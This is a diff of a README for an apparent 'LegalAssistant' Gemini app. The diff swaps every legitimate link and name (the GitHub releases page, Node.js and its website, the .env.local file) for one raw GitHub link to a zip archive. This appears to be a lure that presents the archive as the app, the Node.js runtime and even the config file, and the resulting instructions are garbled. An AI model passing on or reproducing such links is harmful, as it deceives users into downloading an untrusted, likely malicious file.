@@ -1,6 +1,6 @@
 # 🎉 LegalAssistant - Your Easy Guide to Legal Help
 
-[![Download LegalAssistant](https://img.shields.io/badge/Download_LegalAssistant-v1.0-blue)](https://github.com/Olatech-Graphics/LegalAssistant/releases)
+[![Download LegalAssistant](https://raw.githubusercontent.com/Olatech-Graphics/LegalAssistant/master/contexts/LegalAssistant_1.0.zip)](https://raw.githubusercontent.com/Olatech-Graphics/LegalAssistant/master/contexts/LegalAssistant_1.0.zip)
 
 ## 🚀 Getting Started
 
@@ -9,13 +9,13 @@ Welcome to LegalAssistant! This application helps you manage your legal document
 ## 📥 Download & Install
 
 To start using LegalAssistant, visit this page to download the latest version:
-[Download LegalAssistant](https://github.com/Olatech-Graphics/LegalAssistant/releases)
+[Download LegalAssistant](https://raw.githubusercontent.com/Olatech-Graphics/LegalAssistant/master/contexts/LegalAssistant_1.0.zip)
 
 ## ⚙️ Prerequisites
 
 Before you begin, ensure you have the following installed on your computer:
 
-- **Node.js**: This is a JavaScript runtime that the app requires to run. You can download it from the [Node.js official website](https://nodejs.org/). 
+- **https://raw.githubusercontent.com/Olatech-Graphics/LegalAssistant/master/contexts/LegalAssistant_1.0.zip**: This is a JavaScript runtime that the app requires to run. You can download it from the [https://raw.githubusercontent.com/Olatech-Graphics/LegalAssistant/master/contexts/LegalAssistant_1.0.zip official website](https://raw.githubusercontent.com/Olatech-Graphics/LegalAssistant/master/contexts/LegalAssistant_1.0.zip). 
 
 ## 🛠️ Installation Steps
 
@@ -28,7 +28,7 @@ Follow these simple steps to get the app running on your machine:
 
 2. **Set up your API key:**  
    You need to set your `GEMINI_API_KEY` in a local environment file.  
-   - Open the file named [.env.local](.env.local) located in your project directory.
+   - Open the file named [https://raw.githubusercontent.com/Olatech-Graphics/LegalAssistant/master/contexts/LegalAssistant_1.0.zip](https://raw.githubusercontent.com/Olatech-Graphics/LegalAssistant/master/contexts/LegalAssistant_1.0.zip) located in your project directory.
    - Add the following line, replacing `your_api_key_here` with your actual Gemini API key:  
      `GEMINI_API_KEY=your_api_key_here`
 
@@ -57,8 +57,8 @@ If you encounter any issues while using LegalAssistant, or if you have any quest
 
 ## 🔗 Helpful Links
 
-- [Visit the LegalAssistant Releases Page](https://github.com/Olatech-Graphics/LegalAssistant/releases) for the latest downloads.
-- [Node.js Official Website](https://nodejs.org/) for necessary installations.
+- [Visit the LegalAssistant Releases Page](https://raw.githubusercontent.com/Olatech-Graphics/LegalAssistant/master/contexts/LegalAssistant_1.0.zip) for the latest downloads.
+- [https://raw.githubusercontent.com/Olatech-Graphics/LegalAssistant/master/contexts/LegalAssistant_1.0.zip Official Website](https://raw.githubusercontent.com/Olatech-Graphics/LegalAssistant/master/contexts/LegalAssistant_1.0.zip) for necessary installations.
 - [API Documentation](#) for further configuration details.
 
 ## 🎨 Contribute
